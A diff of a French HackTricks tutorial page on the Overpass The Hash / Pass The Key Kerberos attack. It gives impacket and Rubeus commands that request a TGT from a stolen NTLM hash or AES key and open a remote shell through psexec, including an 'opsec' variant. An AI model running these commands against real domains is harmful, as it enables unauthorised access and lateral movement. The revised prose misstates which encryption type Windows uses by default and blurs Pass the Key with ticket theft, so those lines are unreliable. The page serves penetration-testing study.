@@ -7,37 +7,35 @@
 * Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-Cette attaque vise à **utiliser le hachage NTLM de l'utilisateur ou les clés AES pour demander des tickets Kerberos**, comme alternative à la technique commune Pass The Hash sur le protocole NTLM. Par conséquent, cela pourrait être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** en tant que protocole d'authentification.
+L'attaque **Overpass The Hash/Pass The Key (PTK)** est conçue pour les environnements où le protocole NTLM traditionnel est restreint et où l'authentification Kerberos prend le dessus. Cette attaque exploite le hachage NTLM ou les clés AES d'un utilisateur pour solliciter des tickets Kerberos, permettant un accès non autorisé aux ressources d'un réseau.
 
-Pour effectuer cette attaque, le **hachage NTLM (ou le mot de passe) du compte utilisateur ciblé est nécessaire**. Ainsi, une fois le hachage utilisateur obtenu, un TGT peut être demandé pour ce compte. Enfin, il est possible d'**accéder** à tout service ou machine **où le compte utilisateur a des autorisations**.
-```
+Pour exécuter cette attaque, la première étape consiste à acquérir le hachage NTLM ou le mot de passe du compte de l'utilisateur ciblé. Après avoir sécurisé ces informations, un Ticket Granting Ticket (TGT) pour le compte peut être obtenu, permettant à l'attaquant d'accéder à des services ou machines auxquels l'utilisateur a des autorisations.
+
+Le processus peut être initié avec les commandes suivantes:
+```bash
 python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-Vous pouvez **spécifier** `-aesKey [clé AES]` pour indiquer l'utilisation de **AES256**.\
-Vous pouvez également utiliser le ticket avec d'autres outils tels que : smbexec.py ou wmiexec.py
+Pour les scénarios nécessitant AES256, l'option `-aesKey [clé AES]` peut être utilisée. De plus, le ticket acquis peut être utilisé avec divers outils, tels que smbexec.py ou wmiexec.py, élargissant ainsi la portée de l'attaque.
 
-Problèmes possibles :
+Les problèmes rencontrés tels que _PyAsn1Error_ ou _KDC cannot find the name_ sont généralement résolus en mettant à jour la bibliothèque Impacket ou en utilisant le nom d'hôte à la place de l'adresse IP, assurant ainsi la compatibilité avec le KDC Kerberos.
 
-* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Résolu en mettant à jour impacket vers la dernière version.
-* _KDC can’t found the name_ : Résolu en utilisant le nom d'hôte au lieu de l'adresse IP, car il n'était pas reconnu par Kerberos KDC.
-```
+Une séquence de commandes alternative utilisant Rubeus.exe démontre un autre aspect de cette technique :
+```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-Ce type d'attaque est similaire à **Pass the Key**, mais au lieu d'utiliser des hachages pour demander un ticket, le ticket lui-même est volé et utilisé pour s'authentifier en tant que propriétaire.
+Cette méthode reflète l'approche **Pass the Key**, en mettant l'accent sur la prise de contrôle et l'utilisation directe du ticket à des fins d'authentification. Il est crucial de noter que l'initiation d'une demande de TGT déclenche l'événement `4768: Un ticket d'authentification Kerberos (TGT) a été demandé`, signifiant une utilisation par défaut de RC4-HMAC, bien que les systèmes Windows modernes préfèrent AES256.
 
-{% hint style="warning" %}
-Lorsqu'un TGT est demandé, l'événement `4768: Un ticket d'authentification Kerberos (TGT) a été demandé` est généré. Vous pouvez voir dans la sortie ci-dessus que le KeyType est **RC4-HMAC** (0x17), mais le type par défaut pour Windows est maintenant **AES256** (0x12).
-{% endhint %}
+Pour se conformer à la sécurité opérationnelle et utiliser AES256, la commande suivante peut être appliquée:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
@@ -52,7 +50,7 @@ Lorsqu'un TGT est demandé, l'événement `4768: Un ticket d'authentification Ke
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
